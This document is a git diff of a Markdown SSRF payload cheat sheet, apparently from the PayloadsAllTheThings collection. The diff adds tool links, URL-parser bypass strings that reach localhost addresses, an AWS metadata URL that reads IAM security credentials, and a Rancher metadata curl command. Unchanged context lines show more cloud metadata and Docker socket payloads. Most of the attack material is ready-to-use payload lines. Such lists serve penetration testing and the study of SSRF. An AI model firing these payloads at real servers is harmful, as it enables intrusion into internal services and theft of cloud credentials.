@@ -1,6 +1,11 @@
 # Server-Side Request Forgery
 
-Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on behalf of him.
+Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf.
+
+Tools:
+
+- [SSRFmap - https://github.com/swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap)
+- [Gopherus - https://github.com/tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)
 
 ## Summary
 
@@ -85,8 +90,8 @@ Bypass localhost with a domain redirecting to locahost
 
 ```powershell
 http://localtest.me
-http://n-pn.info
 http://customer1.app.localhost.my.company.127.0.0.1.nip.io
+http://mail.ebc.apple.com redirect to 127.0.0.6 == localhost
 ```
 
 The service nip.io is awesome for that, it will convert any ip address as a dns.
@@ -150,6 +155,18 @@ http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
 List:
 ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
 ```
+
+Bypass against a weak parser - by Orange Tsai ([Blackhat A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf))
+
+```powershell
+http://127.1.1.1:80\@127.2.2.2:80/
+http://127.1.1.1:80\@@127.2.2.2:80/
+http://127.1.1.1:80:\@@127.2.2.2:80/
+http://127.1.1.1:80#\@127.2.2.2:80/
+```
+
+![https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/SSRF%20injection/SSRF_Parser.png](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/SSRF%20injection/WeakParser.jpg)
+
 
 ## SSRF via URL Scheme
 
@@ -306,6 +323,7 @@ http://169.254.169.254/latest/meta-data/hostname
 http://169.254.169.254/latest/meta-data/public-keys/
 http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
 http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
+http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
 ```
 
 ### SSRF URL for Google Cloud
@@ -423,6 +441,13 @@ bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
 bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
 ```
 
+### SSRF URL for Rancher
+
+```powershell
+curl http://rancher-metadata/<version>/<path>
+```
+
+More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-service/
 
 ## Thanks to
 
@@ -439,3 +464,4 @@ bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
 * [PHP SSRF @secjuice](https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51)
 * [How I convert SSRF to xss in a ssrf vulnerable Jira](https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158)
 * [Piercing the Veil: Server Side Request Forgery to NIPRNet access](https://medium.com/bugbountywriteup/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a)
+* [Hacker101 SSRF](https://www.youtube.com/watch?v=66ni2BTIjS8)
